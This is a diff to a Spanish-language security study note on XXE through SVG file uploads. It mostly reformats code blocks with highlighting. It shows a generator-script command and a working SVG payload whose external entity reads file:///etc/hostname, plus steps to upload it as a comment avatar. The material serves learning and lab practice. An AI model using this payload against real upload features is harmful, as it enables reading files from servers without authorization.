@@ -18,19 +18,17 @@ tags:
 - **Por qué funciona igual:** un **SVG es XML** → el procesador de imágenes lo parsea → el mismo XXE clásico, pero **dentro del SVG**.
 
 ## Cómo explotarlo
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
 Generá el SVG con el script (recurso parametrizable) → [[vulnerabilities/006-xxe/scripts/README|scripts/gen_svg_xxe.py]]:
-```bash
-python gen_svg_xxe.py -r file:///etc/hostname -o xxe.svg
-```
+<pre><code>python gen_svg_xxe.py -r <mark>file:///etc/hostname</mark> -o xxe.svg</code></pre>
 Produce:
-```xml
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
-     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-  <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-```
+<pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "<mark>file:///etc/hostname</mark>" &gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+  &lt;text font-size="16" x="0" y="16"&gt;<mark>&amp;xxe;</mark>&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
 
 **Flujo:**
 1. Postear un comentario **subiendo `xxe.svg` como avatar**.
